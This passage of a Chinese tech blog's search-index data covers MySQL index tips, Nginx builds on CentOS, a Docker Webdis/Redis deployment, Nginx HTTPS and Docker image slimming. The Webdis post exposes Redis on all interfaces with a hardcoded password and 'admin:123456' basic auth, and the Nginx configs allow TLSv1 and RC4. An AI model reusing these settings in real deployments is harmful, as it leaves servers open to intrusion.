估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 锁优化查询表级锁争用情况 其他优化group by 优化group by 之后默认会执行排序操作，可以使用 group by xxx order by null 强制不进行排序操作。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"数据库"},{title:"Centos7 生产环境安装 Nginx",url:"/posts/9da397da.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Supervisor 12345678910111213# 提示：supervisor主要用于管理nginx的开机自启动（带守护进程）# 安装# yum install -y supervisor# 开机自启动# systemctl enable supervisord# 启动服务# systemctl start supervisord# 查看服务状态# systemctl status supervisord 更改系统的最大打开文件描述符数 本站教程 创建 Nginx 用户和用户组 12345678# 切换root用户$ sudo -i# 创建nginx用户组# groupadd nginx# 创建nginx用户（不允许远程登录）# useradd -g nginx nginx -s /bin/false 下载 Nginx 123456789# 创建下载目录# mkdir -p /home/nginx/software# 下载# cd /home/nginx/software# wget http://nginx.org/download/nginx-1.16.0.tar.gz# 解压# tar -xvf nginx-1.16.0.tar.gz 编译安装 Nginx 123456789101112131415161718192021222324252627# 进入下载目录# cd /home/nginx/software/nginx-1.16.0# 安装依赖库# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# 配置./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# 编译安装# make &amp;&amp; make install# 备份默认的配置文件# cd /usr/local/nginx/conf# cp nginx.conf nginx.conf.default# 文件授权# chown -R nginx:nginx /usr/local/nginx 配置 Nginx 1234567# 编辑nginx的配置文件# vim /usr/local/nginx/conf/nginx.confworker_processes 4;error_log logs/error.log;# 校验配置文件是否正确# /usr/local/nginx/sbin/nginx -t 开机自启动 Nginx 1234567891011121314151617181920212223242526272829303132# 创建nginx的supervistor配置文件# touch /etc/supervisord.d/nginx.ini# 编辑nginx的supervistor配置文件# vim /etc/supervisord.d/nginx.ini[program:nginx]directory=/usr/local/nginxcommand=/usr/local/nginx/sbin/nginx -g \'daemon off;\' -c /usr/local/nginx/conf/nginx.confuser=rootnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/nginx.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/nginx-error.log# 上面的配置，主进程会以root用户运行，worker进程会以nginx用户运行# 重载nginx的supervistor配置文件，会自动启动nginx服务# supervisorctl reload# 查看nginx的运行状态# supervisorctl status nginxnginx RUNNING pid 9451, uptime 0:00:56 #如果输出此日志信息，说明nginx启动成功，否则查看nginx的启动日志来排查问题# 测试访问nginx# curl -I -X GET 127.0.0.1:80 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=80/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 Nginx 服务 1234567891011121314# 关闭# supervisorctl stop nginx# 启动# supervisorctl start nginx# 重启# supervisorctl restart nginx# 查看状态# supervisorctl status nginx# 平滑更新nginx的配置文件# /usr/local/nginx/sbin/nginx -s reload Nginx 配置概述 12345安装目录：/usr/local/nginx配置文件：/usr/local/nginx/conf/nginx.conf错误日志：/usr/local/nginx/logs/error.log访问日志：/usr/local/nginx/logs/access.lognginx的supervistor配置文件：/etc/supervisord.d/nginx.ini var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"web服务器 centos"},{title:"Docker 安装 Webdis",url:"/posts/c87853c9.html",text:'前言 Webdis 是一个非常简单的 Web 服务器，专门为 Redis 提供 HTTP 接口，使用 hiredis、jansson、libevent、http-parser 等组件。下面将介绍 Docker 安装部署 Webdis 与 Redis，由于篇幅有限不会详细介绍部署过程，但会给出 Docker 相关的主要配置内容。如需更详细的教程内容，可参考 Webdis Github 上的说明文档。 软件环境 环境名称 版本 docker-ce 18.09.3 docker-compose 1.24.0-rc1 linux 发行版 CentOS Linux release 7.6.1810 (Core) Webdis 镜像的 DockerFile 12345678910111213141516171819202122232425262728from debian:stretchMAINTAINER clay&lt;clay@gmail.com&gt;RUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install apt-utils vim net-tools telnet git curl wget make gcc libevent-devRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveENV version 0.1.4WORKDIR /usr/localRUN wget --no-check-certificate https://github.com/nicolasff/webdis/archive/$version.tar.gz -O webdis-$version.tar.gzRUN tar -xvzf webdis-$version.tar.gzRUN cd webdis-$version &amp;&amp; make &amp;&amp; make install &amp;&amp; cd ..RUN rm -rf webdis-$version.tag.gzWORKDIR /usr/local/webdis-$versionEXPOSE 7379CMD /usr/local/bin/webdis /etc/webdis.prod.json &amp;&amp; bash 构建 Webdis 镜像 12345678# 创建DockerFile# touch Dockerfile-Webdis# 将上述内容写入到DockerFile中# vim Dockerfile-Webdis# 构建Webdis镜像# docker build -f Dockerfile-Webdis -t clay/webdis:0.1.4 . Redis 的配置文件 Redis 配置文件中的主要内容（redis.conf）如下： 12345# 注释掉下面这一行，不绑定任何主机IP# bind 127.0.0.1# 设置Redis密码requirepass C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL Webdis 的配置文件 Webdis 配置文件（webdis.prod.json）的完整内容如下，具体的 ACL 规则可参考 Github 上的说明文档。考虑到服务器安全，下面配置了 Http Auth 的用户名和密码。 1234567891011121314151617181920212223242526{ "redis_host": "172.89.0.2", "redis_port": 6379, "redis_auth": "C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL", "http_host": "0.0.0.0", "http_port": 7379, "threads": 4, "daemonize": false, "database": 0, "acl": [ { "disabled": ["DEBUG", "FLUSHDB", "FLUSHALL", "GET", "SET", "DEL"] }, { "http_basic_auth": "admin:123456", "enabled": ["DEBUG", "GET", "SET", "DEL"] } ], "verbosity": 3, "logfile": "/var/log/webdis.log"} Docker-Compose 的配置文件 使用 Docker-Compose 管理容器，其中 docker-compose.yml 配置文件的完整内容如下（包括 Redis、Webdis）。具体的数据卷挂载目录，需要根据自己的实际情况进行修改。 123456789101112131415161718192021222324252627282930313233343536373839version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.conf webdis: image: clay/webdis:0.1.4 container_name: webdis privileged: false depends_on: - redis networks: redis-network: ipv4_address: 172.89.0.3 ports: - 7379:7379 volumes: - \'/container/wedis/webdis.log:/var/log/webdis.log\' - \'/container/wedis/webdis.prod.json:/etc/webdis.prod.json\'networks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 创建并启动 Docker 容器 1234567891011# 进入docker-compose.yml配置文件所在的目录# cd docker-compose-dir# 以后台方式启动Redis、Webdis容器# docker-compose up -d# 查看容器的启动情况# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESebd5cac7fee9 clay/webdis:0.1.4 "/bin/sh -c \'/usr/lo…" 14 minutes ago Up 14 minutes 0.0.0.0:7379-&gt;7379/tcp webdis9a1feb971d1c redis:5.0.4-stretch "docker-entrypoint.s…" 14 minutes ago Up 14 minutes 0.0.0.0:6379-&gt;6379/tcp redis-5.0.4 CURL 命令测试 Webdis 与 Redis 是否正常工作 1234567891011# 写入key# curl http://127.0.0.1:7379/SET/hello/world -u admin:123456{"SET":[true,"OK"]}# 获取key# curl http://127.0.0.1:7379/GET/hello -u admin:123456{"GET":"world"}# 删除key# curl http://127.0.0.1:7379/DEL/hello -u admin:123456{"DEL":1} NodeJS 代码测试 Webdis 与 Redis 是否正常工作 123456789101112131415161718192021222324var request = require(\'request\');var username = "admin";var password = "123456";var url = \'http://127.0.0.1:7379/GET/hello\';var auth = "Basic " + new Buffer(username + ":" + password).toString("base64");request({ url: url, headers: { "Authorization": auth } }, function(error, response, body) { if (error) { console.log(error); return; } if (response.statusCode == 200) { console.log("result: " + body); } else { console.log("code: " + response.statusCode); } }); WebSocket 与 Pub/Sub 的支持 Webdis 默认不启用 WebSocket 与 Pub/Sub 的支持，如需要相关功能，可以参考以下的步骤进行操作。官方声明 Websocket 与 Pub/Sub 功能是实验性的，生产环境慎用。经过反复测试，按照下面的步骤进行操作，JavaScript 代码依然无法连接 WebSocket、Pub/Sub 服务，后续再想办法解决。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 连接上面创建的webdis容器# docker run -it webdis /bin/bash# 进入webdis的tests目录# cd /usr/local/webdis-0.1.4/tests# tests目录结构介绍|-- Makefile|-- README.tests|-- basic.py # 单元测试脚本|-- bench.sh # 压测脚本|-- limits.py|-- pubsub.c # pub/sub支持|-- websocket.c # websocket支持`-- websocket.html # websocket的html5测试页面# 编译websocket、pub/sub的代码# make# 查看websocket命令的使用方法$ ./websocket -hUsage: ./websocket [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -c threads (default = 4) -n count (number of messages per thread, default = 100000) -v (verbose)# 启动websocket服务，其中127.0.0.1是webdis服务的IP，7379是webdis服务的端口$ ./websocket -h 127.0.0.1 -p 7379 -v# 查看pubsub命令的使用方法$ ./pubsub -hUsage: ./pubsub [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -r readers (default = 450) -w writers (default = 10) -c channels (default = 1) -n messages (number of messages to read in total, default = 100000)# 启动pub/sub服务，其中127.0.0.1是webdis服务的IP，7379是webdis服务的端口# 经测试，pub/sub服务的启动会导致webdis服务意外停止，原因暂时未知$ ./pubsub -h 127.0.0.1 -p 7379 JavaScript 代码测试 WebSocket 服务 1234567891011121314function testJSON() { var jsonSocket = new WebSocket("ws://127.0.0.1:7379/.json"); jsonSocket.onopen = function() { console.log("JSON socket connected!"); jsonSocket.send(JSON.stringify(["SET", "hello", "world"])); jsonSocket.send(JSON.stringify(["GET", "hello"])); }; jsonSocket.onmessage = function(messageEvent) { console.log("JSON received:", messageEvent.data); };}testJSON(); JavaScript 代码测试 Pub/Sub 服务 1234567891011121314var previous_response_length = 0xhr = new XMLHttpRequest()xhr.open("GET", "http://127.0.0.1:7379/SUBSCRIBE/hello", true);xhr.onreadystatechange = checkData;xhr.send(null);function checkData() { if(xhr.readyState == 3) { response = xhr.responseText; chunk = response.slice(previous_response_length); previous_response_length = response.length; console.log(chunk); }}; Webdis 的 SSL 支持 Webdis 官方默认不支持 SSL，如果需要 SSL 的支持，可以使用 Nginx 作为反向代理服务器，即配置 Nginx 的代理与 SSL 证书，然后将请求转发给 Webdis，这样就可以提高 Webdis 连接的安全性。Nginx 的示例配置内容如下： 1234567891011121314151617181920212223server { listen 18379; # Webdis的IP与端口 server_name 172.89.0.3:7379; # SSL证书 ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; location / { # 代理 proxy_pass http://$server_name; }} 12# 使用CURL命令测试Nginx的代理与SSL配置是否正确，其中example.com是绑定了SSL证书的域名# curl https://example.com:18379/GET/hello -u admin:123456 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 缓存"},{title:"3D 打印备忘录",url:"/posts/d06622f5.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af788dd4f62e8eb66ae305f630934e5a372b3b0f7d6553bed8353ebd19956f4e8ad23f696e7967853cc33f6d6ee5b71eaa7c96ca051a6def086e08b46a5872168fa6b5560b18d7d933e854833d7331aee9c96e79b865d1f4ff97deabe5a78e813f8331ca97fb91b9e053f2cb1eb989e4a1d09b46d8a20e893120edcc81d062359f1eea934a5dcb39734cc45f08b7b39874721ddc1970fb17aee30f34d585548f100e30bceb63c5c785a2d15ab5196a7ff6c1df32ba27195f63b965a0631bb7e259acac6bcec1ace74d5d82ecf816cdc7b782562d646edd642a4780fd547c1f5bee93f4f8831fb2ea5d9e5a1d38c93d2dfeeaf87ffe671a4d4a4e51660276bcfe1ccfc883d5dfd3eb9895a011c340719244a4122c78aadf0d1f4b43717cfe67646c639dbf332f39ccce9bebfa4709c0158b54435f3806967617987c50db4203bbe03dde35d6147f56cf81e816de976f64bad2787bb4e2490c6cc04d7c7f3ec36d987d4b9a899f949457ec11825211615e18ad01a4519cec2f10b9b02db2b1107c0ddae5133a2e1b7c27ec62b49c22a8e4171191faabd4a6f609898759d91bca06c7bedf139c0cb12bea46007e03f328794e2a257bfb8a8c0060c43ebde849996ee6cb23cfef2a0566581b918e4ca655e86c286e89424c42da62995bcdd29a919c652b693572386bbeacc1cf61bcb199c11158663943e487525c6e069d80a57c29a13600284233a81daba20e8924d27a2f096f59c3c5eb26b868c285b68e9546fc4876fa74c1961484c22d4a8a8206e1a4dffc068ad65de59878c7b0a64bc1ea727cc89ae43d1720d250da528a36eb6dfd8c7c8cea42db6bde1196840ccd1b5b72676e3e78972fb36e0f62fd93cb90feb959f04b29e8ca87f939b91581fbc9e991bc7be4945a19fef8291c1201fec7ee39fc70fb5f9476fe9b466d2c1df803a4e7306b371ce49f736731903ff09e8cc66c54a4253af34c4afeafbf2608fa1326435c3c1c18124f6f5d9ce3f452baa246e5aef0d7a3ed8f2cf9f334d2d69b6fa6a49b84aca12b5763a43c8360d05620d8723bed5e31faee258502518f10c715fef71b2ca55c33ccff63e82cabd4f296195a04d99aa5c078e1945f416771ade436b5c9668b7c306a457f10684e38228a879967f34b6ac9ff6ad59f584c46848c9a0617eb14a0aed05d194d31fe8f8d5e5c1efff40d73bd300f7cac21cbe8febbf96ecf9cadb140ed6b02b159044e2a6db24113528681dbf06e119e9d599b5229d59295dc30ac391a45b1cf0769298acc1ee7f453ec4f60d8412ccf5ca24476d573f66ab9c71e4e5b6f4318fb19349e265e46f943b55ce9bb1ad9157a3ecd5cb086f4637a8e42d091915b8f5e5a7b45e62d773e7ca53fd601269fecefbe6bf902f35236598de82b18b2b650ec4175a70221335e434970ae208afebacc0b3a03c35c00ae3015b9fdc3acb13e62f638b02e4bfe5b2490008c7ded6a8d5411d0d712fab3a4ddd358851ff6d4a5d1f144095bb4908da3607b1617527d7ac44e4f928778384b97e706558ff8fd796ffa70c870fae475d311211ac2fc26940ce2fe8562f9d208e0dac3e8b16c04d316d8ab0d9ed70e6c2ede1ee2cc4942428897895d184335a29cad331bc4e351bb0e042d41b043d3d0961161af6ad2417da9f0e2a5a91607a43b9944ae56694e6c93e48b1fe8b620b6f8d506a4f9d2d440445b8bc3b92b5b1b23b5d1727be91012182a7a689a301bd6ec34ab06b87868a6560f5a206cfd2d1e0b57b55b10ebe1a531d779eabe2bb33689647b522c5f2f235b12c18e6e8398c40ed98dcad5597993f0d82f7838bb6a3e262a159eb1e5c4f0bb987a6c14991958 请 输 入 阅 读 密 码.",tags:"生活随笔"},{title:"Nginx 配置 Https",url:"/posts/d65a2736.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.12.2.el7.x86_64 #1 SMP Tue May 14 21:24:32 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 系统安装 OpenSSL 12345# 更新系统# yum update# 安装openssl# yum install openssl openssl-devel Nginx 安装 SSL 模块 1234567891011121314# 配置编译# ./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module# 编译安装，会覆盖已安装的Nginx# make &amp;&amp; make install Nginx 配置 SSL 证书与 SSL 性能调优 123456789101112131415161718server { listen 443; server_name www.example.cn; # SSL证书 ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} Nginx 配置 Http 跳转 Https 123456789101112131415161718192021222324252627# 第一种写法server { listen 80; server_name www.example.cn; rewrite ^(.*) https://$server_name$1 permanent;}# 第二种写法，将http的url通过301状态码重定向到https的url上server { listen 80; server_name www.example.cn; return 301 https://$server_name$request_uri;}server { listen 443; server_name www.example.cn; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} Nginx 配置支持同时访问 80 和 443 端口 1234567891011121314151617181920212223server { listen 80; listen 443 ssl; server_name www.example.cn; if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSL证书 # ssl on; # 注释掉 ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"web服务器"},{title:"Docker 之十八镜像瘦身",url:"/posts/4880517.html",text:'缓存 Docker 的优点之一是提供缓存，帮助你更快地迭代镜像构建。在构建映像时，Docker 按步骤遍历 Dockerfile 中的指令，按顺序执行每个指令。在检查每个指令时，Docker 会在其缓存中寻找一个可以重用的现有中间镜像，而不是创建一个新的 (重复的) 中间镜像。如果缓存无效，让无效的指令和所有后续 Dockerfile 指令生成新的中间镜像。因此，从 Dockerfile 的顶部开始，如果基础镜像已经在缓存中，那么它将被重用。然后将下一条指令与从该基础镜像派生的缓存中的所有子镜像进行比较。比较每个缓存的中间镜像，看指令是否在缓存命中。如果缓存失败，则缓存无效。重复相同的过程，直到到达 Dockerfile 的末尾。 缓存陷阱 大多数新指令只是简单地与中间镜像中的指令进行比较。如果匹配，则使用缓存的副本。例如，当在 Dockerfile 中找到 RUN pip install -r requiremtes .txt 指令时，Docker 会在本地缓存的中间镜像中搜索相同的指令。不比较新旧 requirements.txt 文件的内容。如果使用新包来更新 requirements.txt 文件，并使用 RUN pip install 并希望使用新包名称重新运行包安装，则此行为可能会出现问题。后续会展示一些解决方案。与其他 Docker 指令不同，ADD 和 COPY 指令确实需要 Docker 查看文件的内容，以确定是否存在缓存命中。将引用文件的校验和与现有中间镜像中的校验和进行比较。如果文件内容或元数据发生了更改，则缓存无效。 有效使用缓存的技巧 可以通过传递 –no-cache=True 给 docker build 关闭缓存。 如果你要对指令进行更改，那么接下来的每一层都将频繁地重新构建。要利用缓存，请在 Dockerfile 中尽可能靠后放置可能更改的指令。 合并 RUN apt-get update 和 apt-get install 命令，以避免缓存丢失问题。 如果你正在使用带有 requirements.txt 文件的包安装程序 (如 pip)，那么请遵循如下模型，以确保你不会收到带有 requirements.txt 中列出的旧包的陈旧的中间镜像。123COPY requirements.txt /tmp/RUN pip install -r /tmp/requirements.txtCOPY . /tmp/ 减少镜像体积 Docker 镜像可能会变得很大，让它们的体积变小，这样它们就可以快速拉起，使用很少的资源。Alpine Base 镜像是一个完整的 Linux 发行版，没有太多其他东西。下载通常小于 5mb，但是它需要更多的时间为构建应用程序所需的依赖项编写代码。如果你的容器中需要 Python, Python Alpine 构建是一个不错的折衷方案。它包含 Linux 和 Python，你可以提供大多数其他东西。用最新的 Python Alpine 构建的带有打印脚本 (“hello world”) 的镜像大小为 78.5 MB。Dockerfile 如下： 123FROM python:3.7.2-alpine3.8COPY . /appENTRYPOINT [“python”, “./app/my_script.py”, “my_var”] 多级构建镜像 在 Docker Hub 上，基础镜像的大小为 29MB，当构建子镜像时，需要下载并安装 Python，此时体积就变得很大。除了使用 Alpine 基础镜像，另一种减小镜像大小的方法是使用多级构建。但这种技术还会增加 Dockerfile 的复杂性。多级构建一般使用多个 FROM 指令，可以有选择地将文件 (称为构建工件) 从一个阶段复制到另一个阶段。你可以在最终的镜像中扔掉任何你不想要的东西。这种方法可以减少镜像整体的体积。具体构建流程如下： 每个 FROM 指令 开始构建的新阶段 去掉在之前阶段留下的任何状态 可以用不同的基础镜像 12345678910FROM golang:1.7.3 AS buildWORKDIR /go/src/github.com/alexellis/href-counter/RUN go get -d -v golang.org/x/net/htmlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=build /go/src/github.com/alexellis/href-counter/app .CMD ["./app"] 上面是 DockerFile 中经过修改的多级构建示例，通过给 FROM 指令增加一个名字来命名第一阶段。然后被命名的阶段会通过 COPY –from= 指令引用到 Dockerfile 中。在制造大量容器的情况下，多级构建是有意义的。多级构建可以帮助你从镜像大小中挤出每一寸空间。然而有时多阶段构建会增加复杂性，使镜像更难维护，因此你可能不会在大多数构建中使用它们。 使用 .dockerignore 文件 建议使用 .dockerignore 文件来帮助保持 Docker 镜像的简洁。.dockerignore 类似于.gitignore，它是一个包含 Docker 模式列表的文件，Docker 在生成镜像时需要匹配文件名并排除这些模式。将.dockerignore 文件与 Dockerfile 和构建上下文的其余部分放在同一个文件夹中。运行 docker build 创建镜像时，Docker 会检查 .dockerignore 文件。如果找到则逐行检查文件并使用 Go 的 filepath 匹配规则和 Docker 自己的一些规则来匹配文件名以进行排除。想想 unix 风格的 glob 模式，而不是正则表达式。因此 *.jpg 将排除扩展名为 .jpg 的文件。可以使用以 # 开头的注释来解释在 .dockerignore 中所做的事情。 使用 .dockerignore 文件的好处 帮助你保守秘密。没有人想在镜像中使用密码。 减少镜像大小。更少的文件意味着更小、更快的镜像。 减少构建缓存失效。如果日志或其他文件正在发生变化，而你的镜像缓存因此而失效，则会减慢构建周期。 镜像体积检查 可以使用下面的命令行找到 Docker 镜像和容器的大小 要查看正在运行的容器的大致大小，可以使用 docker container ls -s 命令。 运行 docker image ls 显示镜像的大小。 要查看组成镜像的中间镜像大小，请使用 docker image history my_image:my_tag。 运行 Docker image inspect my_image:tag，该标签将显示跟镜像有关的信息，包括每个层的大小。 安装和使用 dive 工具可以很容易地看到镜像的层内容。 Docker 镜像瘦身总结 尽可能使用正式的基础镜像。官方镜像定期更新，比非官方镜像更安全。 在可能的情况下使用不同的 Alpine 镜像，以保持你的镜像轻量级。 聪明地使用缓存，将可能发生更改的指令放在 Dockerfile 的末尾位置。 使用 .dockerignore 文件将不需要的和不必要的文件从镜像中排除。 使用 dive 工具，可以检查你的 Docker 镜像层，并帮助你削减多余的部分。 尽量不要安装你不需要的软件包，虽然这点很难做到。 在运行指令的末尾包含 &amp;&amp; rm -rf /var/lib/apt/lists/*，以清理 apt 缓存，使其不存储在层中。 如果使用 apt，请在同一指令中将 RUN apt-get update 与 apt-get install 结合使用。然后在该指令中链接多个包。用 \\ 字符在多行上按字母顺序列出包。这种方法减少了要构建的层的数量，并保持简洁，例如： 1234RUN apt-get update &amp;&amp; apt-get install -y \\ package-one \\ package-two \\ &amp;&amp; rm -rf /var/lib/apt/lists/* 本文引用 英文原文链接 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Webpack 构建 Hexo 主题 Yilia 的源码",url:"/posts/4cd11af0.html",text:'相关站点 Yilia Github Yilia 官方构建文档 Yilia 构建常见问题 Yilia 升级 Webpack 版本 构建环境 npm 6.5.0 node 10.15.0 webpack 1.13.2 debian 9 (stretch) 目录结构 layout - 模板目录 languages - 语言配置目录 source-src - 源文件目录，编译到 source 目录 source - Hexo 加载主题资源的主目录，需要编译生成 一般来说，如果想修改页面的 html，可以到 layout 文件夹里直接修改。如果想修改 css、js，则需要到 source-src 文件夹里修改，并通过后面介绍的构建步骤，将源码编译到 source 目录下。 拉取 Yilia 代码 1234567891011121314# 进入Hexo的主题目录# cd /blog-root/themes# 克隆Yilia代码# git clone https://github.com/litten/hexo-theme-yilia.git# 进入Yilia的根目录# cd hexo-theme-yilia# 清理NPM模块的目录# rm -rf node_modules# 安装NPM模块（建议使用VPN）# npm install --unsafe-perm=true --allow-root 执行构建操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# 进入Yilia的根目录# cd hexo-theme-yilia# 清理编译目录（非必要），如果博客已上线一段时间，且考虑到旧用户浏览器的缓存问题，此时必须保留旧的编译文件，否则页面在旧用户的浏览器上可能会显示不正常# rm -rf source/*# 开发可以执行以下命令，此时会用webpack打包，并把文件编译到source目录下，但编译后的文件不会经过压缩处理# 由于webpack打包完成后，不会自动退出，当看到以下日志信息，则代表编译成功，可以使用快捷键 Crtl + C 强制退出# npm run dev&gt; yilia@4.0.0 dev /usr/local/hexo-develop/themes/hexo-theme-yilia&gt; webpackHash: 05a7eebef4ac3b6cddcbVersion: webpack 1.15.0Time: 16582ms Asset Size Chunks Chunk Names img/scrollbar_arrow.png 3.06 kB [emitted] img/default-skin.png 547 bytes [emitted] img/preloader.gif 866 bytes [emitted] fonts/iconfont.b322fa.eot 20 kB [emitted] fonts/iconfont.8c627f.woff 